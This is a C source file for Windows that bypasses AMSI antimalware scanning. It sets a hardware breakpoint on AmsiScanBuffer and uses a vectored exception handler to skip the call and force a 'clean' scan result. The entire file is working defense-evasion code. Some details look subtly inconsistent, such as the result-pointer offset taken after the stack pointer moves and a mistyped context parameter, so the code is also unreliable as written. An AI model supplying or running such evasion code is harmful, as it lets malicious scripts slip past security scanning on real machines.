#include <windows.h>
#include <stdio.h>

#pragma warning(disable: 4334)

typedef enum AMSI_RESULT
{
    AMSI_RESULT_CLEAN = 0,
    AMSI_RESULT_NOT_DETECTED = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 0x4fff,
    AMSI_RESULT_DETECTED = 32768
} 	AMSI_RESULT;

typedef HRESULT( WINAPI* fnAmsiScanBuffer )(
    CONTEXT      amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    PVOID        amsiSession,
    AMSI_RESULT* result
    );
fnAmsiScanBuffer AmsiScanBuffer;


BOOL SetHwBp( HANDLE hThread, PVOID pAddress, DWORD regIndex ) {

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext( hThread, &ctx ) ) {
        return FALSE;
    }

    switch ( regIndex ) {
    case 0: ctx.Dr0 = ( DWORD_PTR )pAddress; break;
    case 1: ctx.Dr1 = ( DWORD_PTR )pAddress; break;
    case 2: ctx.Dr2 = ( DWORD_PTR )pAddress; break;
    case 3: ctx.Dr3 = ( DWORD_PTR )pAddress; break;
    default: return FALSE;
    }

    ctx.Dr7 |= ( 1 << ( regIndex * 2 ) );
    ctx.Dr7 &= ~( 1 << ( 16 + regIndex * 4 ) );
    ctx.Dr7 &= ~( 1 << ( 17 + regIndex * 4 ) );

    if ( !SetThreadContext( hThread, &ctx ) ) {
        return FALSE;
    }

    return TRUE;
}

BOOL RemoveHwBp( HANDLE hThread, DWORD regIndex ) {

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext( hThread, &ctx ) ) {
        printf( "GetThreadContext failed: %d\n", GetLastError() );
        return FALSE;
    }

    switch ( regIndex ) {
    case 0: ctx.Dr0 = 0; break;
    case 1: ctx.Dr1 = 0; break;
    case 2: ctx.Dr2 = 0; break;
    case 3: ctx.Dr3 = 0; break;
    default: return FALSE;
    }

    ctx.Dr7 &= ~( 1 << ( regIndex * 2 ) );

    if ( !SetThreadContext( hThread, &ctx ) ) {
        printf( "SetThreadContext failed: %d\n", GetLastError() );
        return FALSE;
    }

    return TRUE;
}


LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExceptionInfo ) {

    if ( pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {

        if ( pExceptionInfo->ExceptionRecord->ExceptionAddress == ( PVOID )AmsiScanBuffer ) {

            /* x64 calling convention at function entry:
               [RSP+0x00] = Return address (8 bytes)
               [RSP+0x08] = Shadow space for RCX (8 bytes)
               [RSP+0x10] = Shadow space for RDX (8 bytes)
               [RSP+0x18] = Shadow space for R8  (8 bytes)
               [RSP+0x20] = Shadow space for R9  (8 bytes)
               [RSP+0x28] = 5th parameter: amsiSession (8 bytes)
               [RSP+0x30] = 6th parameter: AMSI_RESULT* (8 bytes) */

            PVOID retAddr = *( PVOID* )pExceptionInfo->ContextRecord->Rsp;

            pExceptionInfo->ContextRecord->Rip = ( UINT_PTR )retAddr;
            pExceptionInfo->ContextRecord->Rsp += sizeof( PVOID );
            pExceptionInfo->ContextRecord->Rax = S_OK;

            pExceptionInfo->ContextRecord->Dr6 &= ~0xF;
            pExceptionInfo->ContextRecord->EFlags |= 0x10000;

            AMSI_RESULT* pResult = *( AMSI_RESULT** )( pExceptionInfo->ContextRecord->Rsp + 0x30 );
            *pResult = AMSI_RESULT_CLEAN;

            return EXCEPTION_CONTINUE_EXECUTION;

        }

        return EXCEPTION_CONTINUE_SEARCH;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {

    HMODULE hAmsi = LoadLibraryA( "amsi.dll" );
    if ( !hAmsi ) {
        printf( "Failed to load amsi.dll: %d\n", GetLastError() );
        return 1;
    }

    AmsiScanBuffer = ( fnAmsiScanBuffer )GetProcAddress( hAmsi, "AmsiScanBuffer" );


    printf( "[+] AmsiScanBuffer address: %p\n", AmsiScanBuffer );

    AddVectoredExceptionHandler( 1, VectoredExceptionHandler );

    SetHwBp( GetCurrentThread(), ( PVOID )AmsiScanBuffer, 0 );

    printf( "[+] Breakpoint set at 0x%p\n", AmsiScanBuffer );

    // NtTraceEvent( NULL, 0, 0, NULL );

    system( "pause" );

    RemoveHwBp( GetCurrentThread(), 0 );

    return 0;
}